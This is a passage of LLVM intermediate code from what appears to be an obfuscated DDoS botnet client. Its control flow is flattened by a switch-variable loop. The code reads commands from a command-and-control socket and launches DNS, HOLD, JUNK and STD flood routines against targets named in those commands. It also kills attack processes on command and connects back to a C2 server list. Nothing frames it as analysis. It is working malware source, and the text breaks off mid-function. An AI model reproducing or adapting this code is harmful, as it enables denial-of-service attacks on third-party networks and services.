  %666 = load i8**, i8*** %4, align 8
  %667 = getelementptr inbounds i8*, i8** %666, i64 1
  %668 = load i8*, i8** %667, align 8
  %669 = load i8**, i8*** %4, align 8
  %670 = getelementptr inbounds i8*, i8** %669, i64 2
  %671 = load i8*, i8** %670, align 8
  %672 = load i8**, i8*** %4, align 8
  %673 = getelementptr inbounds i8*, i8** %672, i64 6
  %674 = load i8*, i8** %673, align 8
  %675 = call i32 @atoi(i8* %674) #10
  %676 = load i8**, i8*** %4, align 8
  %677 = getelementptr inbounds i8*, i8** %676, i64 5
  %678 = load i8*, i8** %677, align 8
  %679 = call i32 @atoi(i8* %678) #10
  %680 = call i32 (i32, i8*, ...) @sockprintf(i32 %665, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.463, i32 0, i32 0), i8* %668, i8* %671, i32 %675, i32 %679)
  %681 = load i32, i32* %29, align 4
  %682 = zext i32 %681 to i64
  %683 = call i8* @llvm.stacksave()
  store i8* %683, i8** %33, align 8
  %684 = alloca %struct.thread_data, i64 %682, align 16
  store %struct.thread_data* %684, %struct.thread_data** %.reg2mem2
  store i32 0, i32* %31, align 4
  store i32 2083301479, i32* %switchVar
  br label %loopEnd

; <label>:685:                                    ; preds = %loopEntry
  %686 = load i32, i32* %31, align 4
  %687 = load i32, i32* %29, align 4
  %688 = icmp slt i32 %686, %687
  %689 = select i1 %688, i32 -704295156, i32 2061273460
  store i32 %689, i32* %switchVar
  br label %loopEnd

; <label>:690:                                    ; preds = %loopEntry
  %691 = load i32, i32* %31, align 4
  %692 = load i32, i32* %31, align 4
  %693 = sext i32 %692 to i64
  %.reload8 = load volatile %struct.thread_data*, %struct.thread_data** %.reg2mem2
  %694 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %.reload8, i64 %693
  %695 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %694, i32 0, i32 0
  store i32 %691, i32* %695, align 16
  %696 = load i8**, i8*** %4, align 8
  %697 = getelementptr inbounds i8*, i8** %696, i64 1
  %698 = load i8*, i8** %697, align 8
  %699 = load i32, i32* %31, align 4
  %700 = sext i32 %699 to i64
  %.reload7 = load volatile %struct.thread_data*, %struct.thread_data** %.reg2mem2
  %701 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %.reload7, i64 %700
  %702 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %701, i32 0, i32 1
  store i8* %698, i8** %702, align 8
  %703 = load i8**, i8*** %4, align 8
  %704 = getelementptr inbounds i8*, i8** %703, i64 2
  %705 = load i8*, i8** %704, align 8
  %706 = call i32 @atoi(i8* %705) #10
  %707 = load i32, i32* %31, align 4
  %708 = sext i32 %707 to i64
  %.reload6 = load volatile %struct.thread_data*, %struct.thread_data** %.reg2mem2
  %709 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %.reload6, i64 %708
  %710 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %709, i32 0, i32 2
  store i32 %706, i32* %710, align 16
  %711 = load i32, i32* %32, align 4
  %712 = load i32, i32* %31, align 4
  %713 = sext i32 %712 to i64
  %.reload5 = load volatile %struct.thread_data*, %struct.thread_data** %.reg2mem2
  %714 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %.reload5, i64 %713
  %715 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %714, i32 0, i32 3
  store i32 %711, i32* %715, align 4
  %716 = load i8**, i8*** %4, align 8
  %717 = getelementptr inbounds i8*, i8** %716, i64 6
  %718 = load i8*, i8** %717, align 8
  %719 = call i32 @atoi(i8* %718) #10
  %720 = load i32, i32* %31, align 4
  %721 = sext i32 %720 to i64
  %.reload4 = load volatile %struct.thread_data*, %struct.thread_data** %.reg2mem2
  %722 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %.reload4, i64 %721
  %723 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %722, i32 0, i32 4
  store i32 %719, i32* %723, align 8
  %724 = load i32, i32* %31, align 4
  %725 = sext i32 %724 to i64
  %.reload3 = load volatile %struct.thread_data*, %struct.thread_data** %.reg2mem2
  %726 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %.reload3, i64 %725
  %727 = bitcast %struct.thread_data* %726 to i8*
  call void @dnsflood(i8* %727)
  store i32 -1246576282, i32* %switchVar
  br label %loopEnd

; <label>:728:                                    ; preds = %loopEntry
  %729 = load i32, i32* %31, align 4
  %730 = add nsw i32 %729, 1
  store i32 %730, i32* %31, align 4
  store i32 2083301479, i32* %switchVar
  br label %loopEnd

; <label>:731:                                    ; preds = %loopEntry
  %732 = load i8*, i8** %33, align 8
  call void @llvm.stackrestore(i8* %732)
  store i32 -1161875899, i32* %switchVar
  br label %loopEnd

; <label>:733:                                    ; preds = %loopEntry
  store i32 541601170, i32* %switchVar
  br label %loopEnd

; <label>:734:                                    ; preds = %loopEntry
  %735 = load i8**, i8*** %4, align 8
  %736 = getelementptr inbounds i8*, i8** %735, i64 0
  %737 = load i8*, i8** %736, align 8
  %738 = call i32 @strcmp(i8* %737, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.464, i32 0, i32 0)) #10
  %739 = icmp ne i32 %738, 0
  %740 = select i1 %739, i32 -348657697, i32 1452536123
  store i32 %740, i32* %switchVar
  br label %loopEnd

; <label>:741:                                    ; preds = %loopEntry
  %742 = load i32, i32* %3, align 4
  %743 = icmp slt i32 %742, 4
  %744 = select i1 %743, i32 334928467, i32 1824150781
  store i32 %744, i32* %switchVar
  br label %loopEnd

; <label>:745:                                    ; preds = %loopEntry
  %746 = load i8**, i8*** %4, align 8
  %747 = getelementptr inbounds i8*, i8** %746, i64 2
  %748 = load i8*, i8** %747, align 8
  %749 = call i32 @atoi(i8* %748) #10
  %750 = icmp slt i32 %749, 1
  %751 = select i1 %750, i32 334928467, i32 907181631
  store i32 %751, i32* %switchVar
  br label %loopEnd

; <label>:752:                                    ; preds = %loopEntry
  %753 = load i8**, i8*** %4, align 8
  %754 = getelementptr inbounds i8*, i8** %753, i64 3
  %755 = load i8*, i8** %754, align 8
  %756 = call i32 @atoi(i8* %755) #10
  %757 = icmp slt i32 %756, 1
  %758 = select i1 %757, i32 334928467, i32 -77586927
  store i32 %758, i32* %switchVar
  br label %loopEnd

; <label>:759:                                    ; preds = %loopEntry
  %760 = load i32, i32* @mainCommSock, align 4
  %761 = call i32 (i32, i8*, ...) @sockprintf(i32 %760, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.465, i32 0, i32 0))
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:762:                                    ; preds = %loopEntry
  %763 = load i8**, i8*** %4, align 8
  %764 = getelementptr inbounds i8*, i8** %763, i64 1
  %765 = load i8*, i8** %764, align 8
  store i8* %765, i8** %34, align 8
  %766 = load i8**, i8*** %4, align 8
  %767 = getelementptr inbounds i8*, i8** %766, i64 2
  %768 = load i8*, i8** %767, align 8
  %769 = call i32 @atoi(i8* %768) #10
  store i32 %769, i32* %35, align 4
  %770 = load i8**, i8*** %4, align 8
  %771 = getelementptr inbounds i8*, i8** %770, i64 3
  %772 = load i8*, i8** %771, align 8
  %773 = call i32 @atoi(i8* %772) #10
  store i32 %773, i32* %36, align 4
  %774 = load i8*, i8** %34, align 8
  %775 = call i8* @strstr(i8* %774, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %776 = icmp ne i8* %775, null
  %777 = select i1 %776, i32 805569812, i32 1290863403
  store i32 %777, i32* %switchVar
  br label %loopEnd

; <label>:778:                                    ; preds = %loopEntry
  %779 = load i8*, i8** %34, align 8
  %780 = call i8* @strtok(i8* %779, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %780, i8** %37, align 8
  store i32 1116596450, i32* %switchVar
  br label %loopEnd

; <label>:781:                                    ; preds = %loopEntry
  %782 = load i8*, i8** %37, align 8
  %783 = icmp ne i8* %782, null
  %784 = select i1 %783, i32 -2016706511, i32 1820865050
  store i32 %784, i32* %switchVar
  br label %loopEnd

; <label>:785:                                    ; preds = %loopEntry
  %786 = call i32 @listFork()
  %787 = icmp ne i32 %786, 0
  %788 = select i1 %787, i32 1902190366, i32 313599006
  store i32 %788, i32* %switchVar
  br label %loopEnd

; <label>:789:                                    ; preds = %loopEntry
  %790 = load i8*, i8** %37, align 8
  %791 = load i32, i32* %35, align 4
  %792 = load i32, i32* %36, align 4
  call void @sendHOLD(i8* %790, i32 %791, i32 %792)
  %793 = load i32, i32* @mainCommSock, align 4
  %794 = call i32 @close(i32 %793)
  call void @_exit(i32 0) #12
  unreachable

; <label>:795:                                    ; preds = %loopEntry
  %796 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %796, i8** %37, align 8
  store i32 1116596450, i32* %switchVar
  br label %loopEnd

; <label>:797:                                    ; preds = %loopEntry
  store i32 452268723, i32* %switchVar
  br label %loopEnd

; <label>:798:                                    ; preds = %loopEntry
  %799 = call i32 @listFork()
  %800 = icmp ne i32 %799, 0
  %801 = select i1 %800, i32 -592183059, i32 -1096100741
  store i32 %801, i32* %switchVar
  br label %loopEnd

; <label>:802:                                    ; preds = %loopEntry
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:803:                                    ; preds = %loopEntry
  %804 = load i8*, i8** %34, align 8
  %805 = load i32, i32* %35, align 4
  %806 = load i32, i32* %36, align 4
  call void @sendHOLD(i8* %804, i32 %805, i32 %806)
  call void @_exit(i32 0) #12
  unreachable

; <label>:807:                                    ; preds = %loopEntry
  store i32 -348657697, i32* %switchVar
  br label %loopEnd

; <label>:808:                                    ; preds = %loopEntry
  %809 = load i8**, i8*** %4, align 8
  %810 = getelementptr inbounds i8*, i8** %809, i64 0
  %811 = load i8*, i8** %810, align 8
  %812 = call i32 @strcmp(i8* %811, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.466, i32 0, i32 0)) #10
  %813 = icmp ne i32 %812, 0
  %814 = select i1 %813, i32 1300762162, i32 287187832
  store i32 %814, i32* %switchVar
  br label %loopEnd

; <label>:815:                                    ; preds = %loopEntry
  %816 = load i32, i32* %3, align 4
  %817 = icmp slt i32 %816, 3
  %818 = select i1 %817, i32 -105090153, i32 1504926749
  store i32 %818, i32* %switchVar
  br label %loopEnd

; <label>:819:                                    ; preds = %loopEntry
  %820 = load i8**, i8*** %4, align 8
  %821 = getelementptr inbounds i8*, i8** %820, i64 3
  %822 = load i8*, i8** %821, align 8
  %823 = call i32 @atoi(i8* %822) #10
  %824 = icmp slt i32 %823, 0
  %825 = select i1 %824, i32 -105090153, i32 787415761
  store i32 %825, i32* %switchVar
  br label %loopEnd

; <label>:826:                                    ; preds = %loopEntry
  %827 = load i32, i32* @mainCommSock, align 4
  %828 = call i32 (i32, i8*, ...) @sockprintf(i32 %827, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.467, i32 0, i32 0))
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:829:                                    ; preds = %loopEntry
  %830 = load i8**, i8*** %4, align 8
  %831 = getelementptr inbounds i8*, i8** %830, i64 1
  %832 = load i8*, i8** %831, align 8
  store i8* %832, i8** %38, align 8
  %833 = load i8**, i8*** %4, align 8
  %834 = getelementptr inbounds i8*, i8** %833, i64 2
  %835 = load i8*, i8** %834, align 8
  %836 = call i32 @atoi(i8* %835) #10
  store i32 %836, i32* %39, align 4
  %837 = load i8**, i8*** %4, align 8
  %838 = getelementptr inbounds i8*, i8** %837, i64 3
  %839 = load i8*, i8** %838, align 8
  %840 = call i32 @atoi(i8* %839) #10
  store i32 %840, i32* %40, align 4
  %841 = load i8*, i8** %38, align 8
  %842 = call i8* @strstr(i8* %841, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %843 = icmp ne i8* %842, null
  %844 = select i1 %843, i32 -1309208872, i32 -1006773429
  store i32 %844, i32* %switchVar
  br label %loopEnd

; <label>:845:                                    ; preds = %loopEntry
  %846 = load i8*, i8** %38, align 8
  %847 = call i8* @strtok(i8* %846, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %847, i8** %41, align 8
  store i32 1349154428, i32* %switchVar
  br label %loopEnd

; <label>:848:                                    ; preds = %loopEntry
  %849 = load i8*, i8** %41, align 8
  %850 = icmp ne i8* %849, null
  %851 = select i1 %850, i32 -688029158, i32 -1743174580
  store i32 %851, i32* %switchVar
  br label %loopEnd

; <label>:852:                                    ; preds = %loopEntry
  %853 = call i32 @listFork()
  %854 = icmp ne i32 %853, 0
  %855 = select i1 %854, i32 -840636005, i32 -2120393382
  store i32 %855, i32* %switchVar
  br label %loopEnd

; <label>:856:                                    ; preds = %loopEntry
  %857 = load i8*, i8** %41, align 8
  %858 = load i32, i32* %39, align 4
  %859 = load i32, i32* %40, align 4
  call void @sendJUNK(i8* %857, i32 %858, i32 %859)
  %860 = load i32, i32* @mainCommSock, align 4
  %861 = call i32 @close(i32 %860)
  call void @_exit(i32 0) #12
  unreachable

; <label>:862:                                    ; preds = %loopEntry
  %863 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %863, i8** %41, align 8
  store i32 1349154428, i32* %switchVar
  br label %loopEnd

; <label>:864:                                    ; preds = %loopEntry
  store i32 -753777410, i32* %switchVar
  br label %loopEnd

; <label>:865:                                    ; preds = %loopEntry
  %866 = call i32 @listFork()
  %867 = icmp ne i32 %866, 0
  %868 = select i1 %867, i32 1481589586, i32 -1971617345
  store i32 %868, i32* %switchVar
  br label %loopEnd

; <label>:869:                                    ; preds = %loopEntry
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:870:                                    ; preds = %loopEntry
  %871 = load i8*, i8** %38, align 8
  %872 = load i32, i32* %39, align 4
  %873 = load i32, i32* %40, align 4
  call void @sendJUNK(i8* %871, i32 %872, i32 %873)
  call void @_exit(i32 0) #12
  unreachable

; <label>:874:                                    ; preds = %loopEntry
  store i32 1300762162, i32* %switchVar
  br label %loopEnd

; <label>:875:                                    ; preds = %loopEntry
  %876 = load i8**, i8*** %4, align 8
  %877 = getelementptr inbounds i8*, i8** %876, i64 0
  %878 = load i8*, i8** %877, align 8
  %879 = call i32 @strcmp(i8* %878, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.468, i32 0, i32 0)) #10
  %880 = icmp ne i32 %879, 0
  %881 = select i1 %880, i32 605320799, i32 1467700598
  store i32 %881, i32* %switchVar
  br label %loopEnd

; <label>:882:                                    ; preds = %loopEntry
  %883 = load i32, i32* %3, align 4
  %884 = icmp slt i32 %883, 4
  %885 = select i1 %884, i32 -2060743500, i32 -145539294
  store i32 %885, i32* %switchVar
  br label %loopEnd

; <label>:886:                                    ; preds = %loopEntry
  %887 = load i8**, i8*** %4, align 8
  %888 = getelementptr inbounds i8*, i8** %887, i64 2
  %889 = load i8*, i8** %888, align 8
  %890 = call i32 @atoi(i8* %889) #10
  %891 = icmp slt i32 %890, 1
  %892 = select i1 %891, i32 -2060743500, i32 1712817235
  store i32 %892, i32* %switchVar
  br label %loopEnd

; <label>:893:                                    ; preds = %loopEntry
  %894 = load i8**, i8*** %4, align 8
  %895 = getelementptr inbounds i8*, i8** %894, i64 3
  %896 = load i8*, i8** %895, align 8
  %897 = call i32 @atoi(i8* %896) #10
  %898 = icmp slt i32 %897, 1
  %899 = select i1 %898, i32 -2060743500, i32 -1897280899
  store i32 %899, i32* %switchVar
  br label %loopEnd

; <label>:900:                                    ; preds = %loopEntry
  %901 = load i32, i32* @mainCommSock, align 4
  %902 = call i32 (i32, i8*, ...) @sockprintf(i32 %901, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.469, i32 0, i32 0))
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:903:                                    ; preds = %loopEntry
  %904 = load i8**, i8*** %4, align 8
  %905 = getelementptr inbounds i8*, i8** %904, i64 1
  %906 = load i8*, i8** %905, align 8
  store i8* %906, i8** %42, align 8
  %907 = load i8**, i8*** %4, align 8
  %908 = getelementptr inbounds i8*, i8** %907, i64 2
  %909 = load i8*, i8** %908, align 8
  %910 = call i32 @atoi(i8* %909) #10
  store i32 %910, i32* %43, align 4
  %911 = load i8**, i8*** %4, align 8
  %912 = getelementptr inbounds i8*, i8** %911, i64 3
  %913 = load i8*, i8** %912, align 8
  %914 = call i32 @atoi(i8* %913) #10
  store i32 %914, i32* %44, align 4
  %915 = load i8*, i8** %42, align 8
  %916 = call i8* @strstr(i8* %915, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #10
  %917 = icmp ne i8* %916, null
  %918 = select i1 %917, i32 991846402, i32 -1755045307
  store i32 %918, i32* %switchVar
  br label %loopEnd

; <label>:919:                                    ; preds = %loopEntry
  %920 = load i8*, i8** %42, align 8
  %921 = call i8* @strtok(i8* %920, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %921, i8** %45, align 8
  store i32 1313044117, i32* %switchVar
  br label %loopEnd

; <label>:922:                                    ; preds = %loopEntry
  %923 = load i8*, i8** %45, align 8
  %924 = icmp ne i8* %923, null
  %925 = select i1 %924, i32 6704733, i32 -300777063
  store i32 %925, i32* %switchVar
  br label %loopEnd

; <label>:926:                                    ; preds = %loopEntry
  %927 = call i32 @listFork()
  %928 = icmp ne i32 %927, 0
  %929 = select i1 %928, i32 733141893, i32 -1013413290
  store i32 %929, i32* %switchVar
  br label %loopEnd

; <label>:930:                                    ; preds = %loopEntry
  %931 = load i8*, i8** %45, align 8
  %932 = load i32, i32* %43, align 4
  %933 = load i32, i32* %44, align 4
  call void @sendSTD(i8* %931, i32 %932, i32 %933)
  call void @_exit(i32 0) #12
  unreachable

; <label>:934:                                    ; preds = %loopEntry
  %935 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %935, i8** %45, align 8
  store i32 1313044117, i32* %switchVar
  br label %loopEnd

; <label>:936:                                    ; preds = %loopEntry
  store i32 -454642388, i32* %switchVar
  br label %loopEnd

; <label>:937:                                    ; preds = %loopEntry
  %938 = call i32 @listFork()
  %939 = icmp ne i32 %938, 0
  %940 = select i1 %939, i32 2140456057, i32 -1457109001
  store i32 %940, i32* %switchVar
  br label %loopEnd

; <label>:941:                                    ; preds = %loopEntry
  store i32 649222986, i32* %switchVar
  br label %loopEnd

; <label>:942:                                    ; preds = %loopEntry
  %943 = load i8*, i8** %42, align 8
  %944 = load i32, i32* %43, align 4
  %945 = load i32, i32* %44, align 4
  call void @sendSTD(i8* %943, i32 %944, i32 %945)
  call void @_exit(i32 0) #12
  unreachable

; <label>:946:                                    ; preds = %loopEntry
  store i32 605320799, i32* %switchVar
  br label %loopEnd

; <label>:947:                                    ; preds = %loopEntry
  %948 = load i8**, i8*** %4, align 8
  %949 = getelementptr inbounds i8*, i8** %948, i64 0
  %950 = load i8*, i8** %949, align 8
  %951 = call i32 @strcmp(i8* %950, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i32 0, i32 0)) #10
  %952 = icmp ne i32 %951, 0
  %953 = select i1 %952, i32 1088159816, i32 1647084444
  store i32 %953, i32* %switchVar
  br label %loopEnd

; <label>:954:                                    ; preds = %loopEntry
  store i32 0, i32* %46, align 4
  store i64 0, i64* %47, align 8
  store i32 -523642626, i32* %switchVar
  br label %loopEnd

; <label>:955:                                    ; preds = %loopEntry
  %956 = load i64, i64* %47, align 8
  %957 = load i32, i32* @numpids, align 4
  %958 = sext i32 %957 to i64
  %959 = icmp ult i64 %956, %958
  %960 = select i1 %959, i32 -1974075293, i32 2116031457
  store i32 %960, i32* %switchVar
  br label %loopEnd

; <label>:961:                                    ; preds = %loopEntry
  %962 = load i32*, i32** @pids, align 8
  %963 = load i64, i64* %47, align 8
  %964 = getelementptr inbounds i32, i32* %962, i64 %963
  %965 = load i32, i32* %964, align 4
  %966 = icmp ne i32 %965, 0
  %967 = select i1 %966, i32 847183192, i32 803186226
  store i32 %967, i32* %switchVar
  br label %loopEnd

; <label>:968:                                    ; preds = %loopEntry
  %969 = load i32*, i32** @pids, align 8
  %970 = load i64, i64* %47, align 8
  %971 = getelementptr inbounds i32, i32* %969, i64 %970
  %972 = load i32, i32* %971, align 4
  %973 = call i32 @getpid() #2
  %974 = icmp ne i32 %972, %973
  %975 = select i1 %974, i32 -1069230855, i32 803186226
  store i32 %975, i32* %switchVar
  br label %loopEnd

; <label>:976:                                    ; preds = %loopEntry
  %977 = load i32*, i32** @pids, align 8
  %978 = load i64, i64* %47, align 8
  %979 = getelementptr inbounds i32, i32* %977, i64 %978
  %980 = load i32, i32* %979, align 4
  %981 = call i32 @kill(i32 %980, i32 9) #2
  %982 = load i32, i32* %46, align 4
  %983 = add nsw i32 %982, 1
  store i32 %983, i32* %46, align 4
  store i32 803186226, i32* %switchVar
  br label %loopEnd

; <label>:984:                                    ; preds = %loopEntry
  store i32 -1051676815, i32* %switchVar
  br label %loopEnd

; <label>:985:                                    ; preds = %loopEntry
  %986 = load i64, i64* %47, align 8
  %987 = add i64 %986, 1
  store i64 %987, i64* %47, align 8
  store i32 -523642626, i32* %switchVar
  br label %loopEnd

; <label>:988:                                    ; preds = %loopEntry
  %989 = load i32, i32* %46, align 4
  %990 = icmp sgt i32 %989, 0
  %991 = select i1 %990, i32 -63810277, i32 -1132610098
  store i32 %991, i32* %switchVar
  br label %loopEnd

; <label>:992:                                    ; preds = %loopEntry
  %993 = load i32, i32* @mainCommSock, align 4
  %994 = load i32, i32* %46, align 4
  %995 = call i32 (i32, i8*, ...) @sockprintf(i32 %993, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.471, i32 0, i32 0), i32 %994)
  store i32 -1117594870, i32* %switchVar
  br label %loopEnd

; <label>:996:                                    ; preds = %loopEntry
  %997 = load i32, i32* @mainCommSock, align 4
  %998 = call i32 (i32, i8*, ...) @sockprintf(i32 %997, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.472, i32 0, i32 0))
  store i32 -1117594870, i32* %switchVar
  br label %loopEnd

; <label>:999:                                    ; preds = %loopEntry
  store i32 1088159816, i32* %switchVar
  br label %loopEnd

; <label>:1000:                                   ; preds = %loopEntry
  %1001 = load i8**, i8*** %4, align 8
  %1002 = getelementptr inbounds i8*, i8** %1001, i64 0
  %1003 = load i8*, i8** %1002, align 8
  %1004 = call i32 @strcmp(i8* %1003, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.473, i32 0, i32 0)) #10
  %1005 = icmp ne i32 %1004, 0
  %1006 = select i1 %1005, i32 649222986, i32 34582212
  store i32 %1006, i32* %switchVar
  br label %loopEnd

; <label>:1007:                                   ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:1008:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %1000, %999, %996, %992, %988, %985, %984, %976, %968, %961, %955, %954, %947, %946, %941, %937, %936, %934, %926, %922, %919, %903, %900, %893, %886, %882, %875, %874, %869, %865, %864, %862, %852, %848, %845, %829, %826, %819, %815, %808, %807, %802, %798, %797, %795, %785, %781, %778, %762, %759, %752, %745, %741, %734, %733, %731, %728, %690, %685, %650, %646, %639, %634, %627, %626, %602, %598, %597, %595, %568, %564, %559, %552, %549, %545, %538, %537, %536, %524, %523, %521, %509, %505, %502, %497, %496, %491, %487, %486, %481, %459, %456, %449, %445, %438, %434, %427, %420, %413, %406, %402, %395, %394, %393, %380, %379, %377, %364, %360, %357, %352, %351, %346, %342, %341, %336, %332, %331, %326, %303, %300, %293, %289, %282, %275, %268, %261, %254, %247, %240, %236, %229, %224, %217, %216, %207, %200, %199, %195, %192, %187, %182, %181, %180, %176, %174, %166, %165, %161, %154, %149, %148, %144, %137, %130, %127, %120, %116, %109, %106, %99, %98, %94, %87, %83, %76, %72, %65, %61, %54, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind
declare i64 @sysconf(i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1400748684, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1400748684, label %first
    i32 1391051781, label %8
    i32 1852650446, label %11
    i32 -1308899105, label %17
    i32 1105713954, label %18
    i32 -461778535, label %21
    i32 1959206149, label %32
    i32 -98159232, label %39
    i32 1820880910, label %47
    i32 1456001902, label %48
    i32 -1257658248, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 1391051781, i32 1852650446
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 1852650446, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 -1308899105, i32 1105713954
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 -461778535, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 -461778535, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @cncServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #2
  store i32 23, i32* %3, align 4
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #10
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 1959206149, i32 -98159232
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #10
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  store i8 0, i8* %38, align 1
  store i32 -98159232, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 1456001902, i32 1820880910
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -1257658248, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1257658248, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca %struct.ifreq, align 8
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %2, align 4
  %15 = load i32, i32* %2, align 4
  store i32 %15, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 714850517, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
